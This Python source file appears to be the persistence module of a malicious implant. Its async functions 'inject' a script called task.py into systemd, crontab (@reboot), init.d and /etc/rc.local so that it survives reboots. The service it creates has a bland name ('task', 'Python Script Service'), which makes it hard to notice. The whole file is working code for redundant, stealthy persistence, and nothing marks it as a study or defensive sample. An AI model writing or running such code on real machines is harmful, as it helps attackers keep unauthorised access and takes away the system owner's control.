import os
import stat
import logging

service_name = 'task'
script_path = os.path.join(os.getcwd(), 'task.py')
########################################## Startup ##########################################

## Injecting script to the systemd folder to run on startup
async def inject_systemd():
    try:        
                service_folder_path = '/etc/systemd/system'
                service_file_path = f"{service_folder_path}/{service_name}.service"
                
                ## Checking if directory exists
                if os.path.exists(service_folder_path):
                        ## Checking if already injected script
                        if os.path.exists(service_file_path):
                                logging.info(f"The service {service_name} already injected to systemd")
                                return

                        service_content = f"""
                        [Unit]
                        Description=Python Script Service
                        After=network.target

                        [Service]
                        ExecStart=/usr/bin/python3 {script_path}
                        Restart=on-failure

                        [Install]
                        WantedBy=multi-user.target
                        """
                        
                        ## Writing script to the systemd
                        with open(service_file_path, 'w') as service_file:
                                service_file.write(service_content)

                        ## Enabling script
                        os.system("systemctl daemon-reload")
                        os.system(f"systemctl enable {service_name}.service")
                        os.system(f"systemctl start {service_name}.service")
                        logging.info(f"The service {service_name} has been injected and started successfully")
                else:
                        logging.warning("Systemd doesn't exist")
    except Exception as err:
                logging.error(f'Failed to inject systemd with error - {str(err)}')

## Injecting script to the crontab to run each time the machine restarts
async def inject_crontab():
    try:
                cron_command = f"@reboot /usr/bin/python3 {script_path}"
                
                cron_jobs = os.popen("crontab -l").read()
                
                ## Checking if script already injected
                if cron_command in cron_jobs:
                        logging.info(f"The service {service_name} already injected to crontab.")
                        return
                
                ## Injecting the script as a cronjob
                os.system(f'(crontab -l; echo "{cron_command}") | crontab -')
                logging.info("The cron job has been injected successfully.")
                
    except Exception as err:
                logging.error('Failed to inject crontab')

## Injecting script to the initd folder to run on startup
async def inject_initd():
    try:
                initd_folder_path = "/etc/init.d"
                initd_file_path = f"{initd_folder_path}/{service_name}"
                
                ## Checking if directory exists
                if os.path.exists(initd_folder_path):
                        ## Checking if script already injected
                        if os.path.exists(initd_file_path):
                                logging.info(f"The service {service_name} already injected to init.d.")
                                return

                        initd_content = f"""#!/bin/sh
                        ### BEGIN INIT INFO
                        # Provides:          {service_name}
                        # Required-Start:    $remote_fs $syslog
                        # Required-Stop:     $remote_fs $syslog
                        # Default-Start:     2 3 4 5
                        # Default-Stop:      0 1 6
                        # Short-Description: Start script at boot time
                        ### END INIT INFO

                        /usr/bin/python3 {script_path}
                        """
                        
                        ## Injecting script to the initd
                        with open(initd_file_path, 'w') as initd_file:
                                initd_file.write(initd_content)

                        ## Enabling script
                        os.chmod(initd_file_path, os.stat(initd_file_path).st_mode | stat.S_IEXEC)

                        os.system(f"update-rc.d {service_name} defaults")
                        logging.info(f"The init.d script {service_name} has been injected and added successfully.")
                else:
                        logging.warning("init.d doesn't exist")
        
    except Exception as err:
                logging.error(f'Failed to inject initd with error - {str(err)}')

## Injecting script to the ec localfile to run on startup
async def inject_rc_local():
    try:
                rc_local_path = "/etc/rc.local"
                
                ## Checking if file exists
                if os.path.exists(rc_local_path):
                        with open(rc_local_path, 'r') as rc_local_file:
                                rc_local_content = rc_local_file.read()

                        command = f"/usr/bin/python3 {script_path} &\n"
                        
                        ## Checking if script already injected
                        if command in rc_local_content:
                                logging.info("The command is already injected to rc.local")
                                return
                        
                        rc_local_content = rc_local_content.replace("exit 0", command + "exit 0")
                        
                        ## Injecting script to the rc.local
                        with open(rc_local_path, 'w') as rc_local_file:
                                rc_local_file.write(rc_local_content)

                        ## Enabling script
                        os.system(f"chmod +x {rc_local_path}")
                        logging.info("The command has been injected to rc.local")
                else:
                        logging.warning("rc.local doesn't exist")
    except Exception as err:
                logging.error(f'Failed to inject rc_local with error - {str(err)}')
